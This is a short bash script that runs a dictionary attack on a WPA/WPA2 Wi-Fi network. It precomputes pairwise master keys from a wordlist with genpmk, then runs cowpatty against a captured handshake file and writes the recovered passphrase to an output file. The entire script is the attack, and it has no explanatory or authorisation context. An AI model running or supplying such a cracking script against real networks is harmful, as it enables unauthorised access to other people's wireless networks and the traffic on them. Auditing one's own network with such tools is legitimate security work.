#!/bin/bash

# set variables
SSID="your_wifi_network_name"
WPA_HANDSHAKE="handshake.cap"
WORDLIST="wordlist.txt"
PMK_FILE="output.pmk"
CRACKED_KEY="cracked_key.txt"

# generate PMK file
genpmk -f $WORDLIST -d $PMK_FILE -s $SSID

# launch dictionary attack
cowpatty -d $PMK_FILE -r $WPA_HANDSHAKE -f $WORDLIST -s $SSID -o $CRACKED_KEY
